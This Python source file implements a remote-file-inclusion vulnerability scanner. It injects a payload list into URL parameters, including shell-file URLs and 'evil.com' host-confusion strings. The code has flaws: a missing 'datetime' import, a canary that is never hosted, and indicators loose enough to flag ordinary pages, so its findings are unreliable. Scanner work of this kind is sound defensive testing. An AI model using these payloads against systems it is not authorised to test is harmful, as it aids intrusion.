"""
RFI Scanner - Remote File Inclusion detection with canary mechanism.
"""

from __future__ import annotations

import logging
import random
import string
import requests
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse


class RFIScanner:
    """
    Remote File Inclusion Scanner with canary-based verification.
    """

    # ==========================================================
    # RFI CANARY GENERATION
    # ==========================================================

    @staticmethod
    def generate_canary() -> str:
        """Generate a unique RFI canary string."""
        random_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"SENTINELAI_RFI_CANARY_{random_id}"

    @staticmethod
    def create_test_resource(content: str = None) -> Dict[str, Any]:
        """
        Create a test resource for RFI verification.

        Returns:
            Dict with url, content, and canary
        """
        canary = RFIScanner.generate_canary()
        if content is None:
            content = f"RFI Test Resource\nCanary: {canary}\nTimestamp: {datetime.now().isoformat()}"

        return {
            "canary": canary,
            "content": content,
            "url": f"http://127.0.0.1:8080/test_{canary[:8]}.txt",
        }

    # ==========================================================
    # RFI PAYLOADS
    # ==========================================================

    RFI_PAYLOADS = [
        "http://127.0.0.1:8080/test.txt",
        "http://localhost/test.php",
        "http://test.com/shell.txt",
        "https://test.com/shell.php",
        "http://example.com/shell.txt",
        "http://127.0.0.1%23@evil.com/",
        "http://evil.com@127.0.0.1/",
    ]

    # ==========================================================
    # RFI INDICATORS
    # ==========================================================

    RFI_INDICATORS = {
        "remote_url_in_response": ["http://", "https://"],
        "include_warning": [
            "warning: include",
            "warning: require",
            "failed to open stream",
        ],
        "remote_content": ["test", "remote", "external", "included", "shell"],
        "php_code": ["<?php", "<?=", "echo", "print", "function", "class"],
    }

    def __init__(
        self,
        timeout: int = 10,
        logger: logging.Logger | None = None,
    ) -> None:
        self.timeout = timeout
        self._session = requests.Session()
        self._logger = logger or logging.getLogger(__name__)
        self.scanner_name = "rfi"
        self.canary = None
        self.test_resource = None

    def scan(
        self,
        url: str,
        params: dict[str, Any] | None = None,
        session: requests.Session | None = None,
    ) -> list[dict[str, Any]]:
        """Scan for RFI vulnerabilities."""
        self._logger.info(f"RFI scanning: {url}")

        if session:
            self._session = session

        findings: list[dict[str, Any]] = []

        if params is None:
            params = self._extract_params(url)

        if not params:
            self._logger.debug("No parameters found")
            return findings

        # Generate canary for this scan
        self.canary = self.generate_canary()
        self._logger.debug(f"RFI canary: {self.canary}")

        for param_name in params:
            for payload in self.RFI_PAYLOADS:
                try:
                    result = self._test_rfi(url, param_name, payload)
                    if result:
                        findings.append(result)
                except Exception as e:
                    self._logger.debug(f"Error testing {param_name}: {e}")
                    continue

        self._logger.info(f"RFI scan complete: {len(findings)} findings")
        return findings

    def _test_rfi(
        self,
        url: str,
        param: str,
        payload: str,
    ) -> dict[str, Any] | None:
        """Test a single RFI payload."""
        try:
            test_url = self._inject_payload(url, param, payload)

            start_time = __import__("time").time()
            response = self._session.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=True,
            )
            elapsed = __import__("time").time() - start_time

            # Check for RFI indicators
            is_rfi, indicators, canary_found = self._check_rfi_response(
                response, self.canary
            )

            if is_rfi:
                evidence_list = []
                if response.text:
                    evidence_list.append(response.text[:500])

                # Add matched indicators
                for indicator in indicators:
                    evidence_list.append(f"Found indicator: {indicator}")

                # Add canary result
                if canary_found:
                    evidence_list.append(f"✅ Canary found: {self.canary}")
                else:
                    evidence_list.append(f"❌ Canary not found: {self.canary}")

                return {
                    "type": "RFI",
                    "vulnerability_type": "RFI",
                    "severity": "Critical",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": evidence_list,
                    "references": [],
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "response_time": elapsed,
                    "scanner_name": self.scanner_name,
                    "confidence": 30.0 if not canary_found else 85.0,
                    "verified": False,
                    "is_false_positive": False,
                    "canary": self.canary,
                    "canary_found": canary_found,
                }

        except requests.exceptions.Timeout:
            self._logger.debug(f"RFI timeout: {payload}")
            return None
        except requests.exceptions.ConnectionError:
            self._logger.debug(f"RFI connection error: {payload}")
            return None
        except Exception as e:
            self._logger.debug(f"RFI error: {e}")
            return None

        return None

    def _check_rfi_response(
        self, response: requests.Response, canary: str
    ) -> tuple[bool, List[str], bool]:
        """Check if response indicates RFI success."""
        if not response or not response.text:
            return False, [], False

        text = response.text.lower()
        matched_indicators = []
        canary_found = canary.lower() in text

        # Check indicators
        for key, patterns in self.RFI_INDICATORS.items():
            for pattern in patterns:
                if pattern in text:
                    matched_indicators.append(key)
                    break

        # Determine if RFI detected
        is_rfi = False

        # Strong: Canary found
        if canary_found:
            is_rfi = True
        # Medium: Remote content with indicators
        elif "remote_content" in matched_indicators and len(matched_indicators) >= 2:
            is_rfi = True
        # Weak: Only generic indicators
        elif matched_indicators and "php_code" in matched_indicators:
            is_rfi = True

        return is_rfi, matched_indicators, canary_found

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        query[param] = [payload]
        new_query = urlencode(query, doseq=True)

        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _extract_params(self, url: str) -> list[str]:
        """Extract parameters from URL."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        return list(query.keys())
